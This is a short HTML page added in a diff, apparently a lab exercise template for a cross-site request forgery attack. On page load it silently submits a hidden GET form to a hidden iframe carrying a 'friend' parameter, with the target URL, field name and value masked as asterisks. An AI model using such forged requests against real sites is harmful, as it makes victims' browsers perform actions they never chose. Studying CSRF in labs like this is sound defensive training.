@@ -1,0 +1,35 @@
+<html>
+<head>
+</head>
+
+<body>
+<h1>This page forges an HTTP GET request</h1>
+
+<iframe name='hiddenFrame'  style='display:none'></iframe>
+
+<script>
+window.onload = function(){
+
+  // Create a <form> element
+  var p = document.createElement("form");
+  p.action = "****";
+  p.method = "get";
+  p.target = "hiddenFrame";
+
+  // The attack fills the form with the "friend" parameter
+  // The fields are hidden, the victim will not see them.
+
+  p.innerHTML = "<input type='hidden' name='****' value='****'>";
+
+  // Append the form to the current page
+  document.body.appendChild(p);
+
+  // Submit the form
+  p.submit();
+}
+</script>
+
+
+</body>
+</html>
+
